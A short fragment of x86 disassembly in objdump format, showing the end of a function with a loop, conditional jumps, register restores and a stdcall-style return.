  4078fd:	3b b4 95 50 ff ff ff 	cmp    -0xb0(%ebp,%edx,4),%esi
  407904:	75 e9                	jne    0x4078ef
  407906:	89 55 f4             	mov    %edx,-0xc(%ebp)
  407909:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  40790d:	0f 85 3f fe ff ff    	jne    0x407752
  407913:	ff 45 fc             	incl   -0x4(%ebp)
  407916:	83 45 e4 04          	addl   $0x4,-0x1c(%ebp)
  40791a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40791d:	ff 45 d8             	incl   -0x28(%ebp)
  407920:	3b 4d e8             	cmp    -0x18(%ebp),%ecx
  407923:	0f 8e 1a fe ff ff    	jle    0x407743
  407929:	33 c0                	xor    %eax,%eax
  40792b:	39 45 d0             	cmp    %eax,-0x30(%ebp)
  40792e:	74 09                	je     0x407939
  407930:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  407934:	74 03                	je     0x407939
  407936:	83 c8 ff             	or     $0xffffffff,%eax
  407939:	5f                   	pop    %edi
  40793a:	5e                   	pop    %esi
  40793b:	5b                   	pop    %ebx
  40793c:	c9                   	leave
  40793d:	c2 24 00             	ret    $0x24
